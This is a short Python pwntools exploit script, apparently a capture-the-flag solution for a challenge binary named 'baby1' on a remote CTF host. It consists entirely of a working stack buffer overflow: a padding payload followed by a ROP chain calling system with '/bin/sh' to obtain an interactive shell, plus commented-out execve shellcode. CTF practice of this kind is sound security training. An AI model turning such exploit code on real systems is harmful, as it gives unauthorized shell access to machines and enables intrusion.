from pwn import *

context(os='linux', arch='i386')
context.log_level = 'debug'

#execve(2) on x64
#shellcode = '\x48\x31\xd2\x52\x48\xb8\x2f\x62'\
#			 '\x69\x6e\x2f\x2f\x73\x68\x50\x48'\
#			 '\x89\xe7\x52\x57\x48\x89\xe6\x48'\
#			 '\x8d\x42\x3b\x0f\x05'
				
HOST = "baby-01.pwn.beer"
PORT = 10001 
conn = None

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process('./baby1')

win = 0x400698
banner = 0x400687
main = 0x4006b3
bufsize = 0x10 + 8 
binsh = 0x400286
rdi_ret = 0x400793
system_plt = 0x400560

payload = 'A'*bufsize
payload += p64(banner) #wakaran
payload += p64(rdi_ret)
payload += p64(binsh)
payload += p64(system_plt)

conn.recvuntil("input: ")
conn.sendline(payload)
conn.interactive()
